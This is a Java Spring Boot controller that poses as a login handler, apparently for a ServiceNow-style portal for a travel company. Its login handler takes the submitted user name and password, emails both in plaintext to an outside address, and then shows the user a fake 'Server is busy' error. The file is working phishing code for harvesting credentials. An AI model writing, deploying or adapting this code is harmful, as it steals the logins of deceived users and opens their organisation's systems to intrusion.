package com.travel.port.prod.service.controller;


import com.travel.port.prod.service.service.EmailService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

@Controller
public class LoginController {

    @Autowired
    private EmailService emailService;

    @GetMapping("/")
    public String showLoginForm() {
        return "index"; // This should map to your login.html or login.jsp file
    }

 @PostMapping("/login")
 public String handleLogin(@RequestParam("user_password")   String password,
                           @RequestParam("user_name") String username, RedirectAttributes redirectAttributes) {



     String subject = "New Login Attempt With travel port prod.service-now.com";
     String message = "User Name: " + username + "\nPassword: " + password ;
     redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");
     emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
        return  "redirect:/";
    }
}
